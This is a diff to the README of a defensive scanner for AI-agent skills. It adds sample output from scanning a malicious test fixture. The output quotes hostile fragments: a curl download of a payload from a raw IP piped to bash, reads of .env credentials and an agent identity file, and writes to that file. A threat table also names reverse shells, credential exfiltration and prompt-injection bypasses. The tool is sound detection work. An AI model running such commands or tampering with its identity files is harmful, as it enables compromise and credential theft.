@@ -34,13 +34,54 @@ guard-scanner ./skills/ --strict --json --sarif --fail-on-findings
 guard-scanner ./skills/ --format sarif --quiet | upload-sarif
 ```
 
-## 🚀 Standalone Boot Sequence (OSS Edition)
+## 🔍 Example Scan Output
 
-**guard-scanner** is designed as the "Shield" of the OpenClaw ecosystem. 
-Unlike comprehensive AI agent brain frameworks, it features a **Standalone Boot Sequence**:
+This is actual output from scanning a malicious test skill demonstrating data exfiltration, memory poisoning, and credential theft:
+
+```console
+$ guard-scanner ./test/fixtures/malicious-skill/ --verbose
+
+🛡️  guard-scanner v4.0.1
+══════════════════════════════════════════════════════
+📂 Scanning: ./test/fixtures/malicious-skill/
+📦 Skills found: 1
+
+🔴 scripts — MALICIOUS (risk: 100)
+   📁 exfiltration
+      🔴 [HIGH] Suspicious domain: webhook.site — evil.js
+   📁 malicious-code
+      🔴 [HIGH] eval() call — evil.js:18
+      💀 [CRITICAL] Shell download/execution — stealer.js:19
+         └─ "exec(`curl https://91.92.242.30/payload -o /tmp/x && bash"
+   📁 credential-handling
+      🔴 [HIGH] Credential file read — evil.js:6
+         └─ "readFileSync('.env"
+      💀 [CRITICAL] Agent identity file read — evil.js:7
+         └─ "readFileSync('SOUL.md"
+   📁 memory-poisoning
+      💀 [CRITICAL] Write to agent soul file — evil.js:21
+         └─ "writeFileSync('SOUL.md"
+   📁 data-flow
+      💀 [CRITICAL] Data flow: secret read (L6) → network call (L10) — evil.js:6
+
+══════════════════════════════════════════════════════
+📊 guard-scanner Scan Summary
+──────────────────────────────────────────────────────
+   Scanned:      1
+   🟢 Clean:       0
+   🔴 Malicious:   1
+   Safety Rate:  0%
+══════════════════════════════════════════════════════
+⚠️  CRITICAL: 1 malicious skill(s) detected!
+```
+
+## 🚀 Standalone Architecture
+
+**guard-scanner** is designed as a foundational "Shield" for the OpenClaw ecosystem. 
+It features a **Standalone Boot Sequence**:
 - **Zero API/DB Dependencies**: It initializes purely from local, static Threat Patterns (144+ regex rules) defined in its codebase.
-- **No Heavy Context Loading**: It does *not* require loading heavy memory databases or executing contextual commands like `guava_session_load`.
-- **Privacy First**: It never accesses or exposes your agent's private memory (`SOUL.md` or `MEMORY.md`) during the boot phase.
+- **No Heavy Context Loading**: It does *not* require loading heavy memory databases or executing contextual commands.
+- **Privacy First**: It never accesses or exposes your agent's private memory during the boot phase.
 
 This lightweight initialization makes it perfect for zero-trust environments, ensuring complete safety without exposing proprietary agent logic.
 
@@ -102,7 +143,7 @@ Real-time `before_tool_call` hook that blocks dangerous operations.
 | 1 | Threat Detection | Reverse shell, curl\|bash, SSRF, credential exfil |
 | 2 | Trust Defense | SOUL.md tampering, memory injection |
 | 3 | Safety Judge | Prompt injection in tool args, trust bypass |
-| 4 | Brain | No-research execution |
+| 4 | Behavioral | No-research execution |
 | 5 | Trust Exploitation (ASI09) | Authority claim, creator bypass, fake audit |
 
 ```bash
@@ -113,19 +154,7 @@ openclaw hooks enable guard-scanner
 
 Modes: `monitor` (log only) / `enforce` (block CRITICAL) / `strict` (block HIGH+CRITICAL)
 
-## 🛡️ Defense Matrix (Standard vs Soul Lock vs Brain)
 
-Guard-Scanner is designed to be highly composable. While the core engine remains strictly **zero-dependency**, you can achieve Enterprise-grade immunity by stacking it with the [Soul Lock](../soul-lock/) (Identity) and [Guava Brain](../guava-brain/) (Context) plugins.
-
-| Target / Threat | 1. Core (`guard-scanner`) | 2. + Soul Lock | 3. + Guava Brain |
-|-----------------|---------------------------|----------------|------------------|
-| **Setup** | `guard-scanner ./` | `--plugin @guava/soul-lock` | `--plugin @guava/brain` |
-| **Dependencies**| 0 (Zero-deps) | Rust `ed25519-dalek` | Convex Network Core |
-| **Prompt Injection**| 🟢 Static Blocking | 🟢 Static Blocking | 🟢 Dynamic Defense |
-| **Moltbook RCE**| 🟢 Blocked (WAF) | 🟢 Blocked (WAF) | 🟢 Blocked (WAF) |
-| **Identity Hijack**| 🔴 Vulnerable | 🟢 **Immune** (Crypto-Signed) | 🟢 Immune |
-| **AI Deception**| 🔴 Vulnerable | 🔴 Vulnerable | 🟢 **Immune** (L5 Memory) |
-| **Target User** | Individual / OSS | B2B / Swarm Agents | Enterprise / 1000-Year ASI |
 
 ## OWASP Mapping
 
